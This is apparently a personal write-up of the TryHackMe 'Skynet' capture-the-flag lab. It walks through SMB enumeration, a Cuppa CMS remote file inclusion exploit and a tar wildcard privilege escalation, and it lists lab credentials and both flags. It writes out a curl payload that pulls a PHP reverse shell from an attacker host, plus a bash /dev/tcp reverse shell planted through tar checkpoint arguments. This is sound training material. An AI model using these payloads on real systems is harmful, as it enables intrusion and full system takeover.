# Skynet - THM CTF

## d0nkeyk0ng787
## COMPLETED 1302 12 MAY 22

### Box IP - 10.10.15.129

### Creds

EMAIL - milesdyson:cyborg007haloterminator
SMB - 'milesdyson:)s{A&2Z=F^n_E.B`'

### Enum

Open Ports - 22, 80, 110, 139, 143, 445

Interesting pages found with gobuster - /admin, /config, /squirrelmail

Both /admin and /config return 403s but squirrelmail provides a login page that is likely an attack vector

We see the server is running samba which might be a possible attack vector aswell

Trying to access the samba server using smbclient requires a root password but was worth a try

There is also a pop3 server on 110 which is the email server

Running the command "smbmap -H 10.10.15.129" gives us some useful information regarding shares on the samba server

We see there is a READ ONLY share named anonymous

Running the command 'smbclient //10.10.15.129/anonymous -U guest' we can take a look. Inside this share there is an attention.txt file and 3 log files

Attention.txt suggests there was a system malfunction causing all employees to have to change their passwords. Log1 looks to contain a list of potential passwords for miles dawsons account we can try bruteforce.

We can assume that miles username is 'milesdyson' as that is the name of his share on samba. So before I bruteforced it I just wanted to see if I would get any indication that the username was correct so I tried milesdyson and the first string in the log1.txt which turned out to be the username:password combo. Kinda lucky but we take those wins.

In the emails we find a password for smb, some binary and a random message that looks like rambling

Using the username and password we got from the emails we can access the milesdyson share on samba

We find an important.txt file which contains the link to a hidden page on the website

It's always worth using gobuster on a secret page like this since the page itself doesn't really have much. From gobuster we can see there is a /administrator page

On this page we see it is running a CMS named Cuppa. A simple search on exploitdb returns a known RFI vulnerability we can use to get a remote shell on the server. Using the following payload we can exploit this vulnerability.

curl -s --data-urlencode urlConfig=http://10.10.10.10:80/php-reverse-shell.php http://10.10.15.129/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php

After upgrading the shell, we can grab the user flag

### Priv Esc

We see that there is a backup script 'backup.sh' that compresses and backups the entire /var/www/html directory and puts it in milesdysons home directory. This may offer a possible route of priv esc.

GTFO bins has a tar entry which we can use to break out of a restricted shell 'tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh'

Using the following commands and starting another nc listener on 6666 we can get a root shell

printf '#!/bin/bash\nbash -i >& /dev/tcp/10.10.10.10./6666 0>&1' > /var/www/html/shell
chmod +x /var/www/html/shell
touch /var/www/html/--checkpoint=1
touch /var/www/html/--checkpoint-action=exec=bash\ shell

From here we can grab the root flag


### Flags

User Flag - 7ce5c2109a40f958099283600a9ae807
Root Flag - 3f0372db24753accc7179a282cd6a949
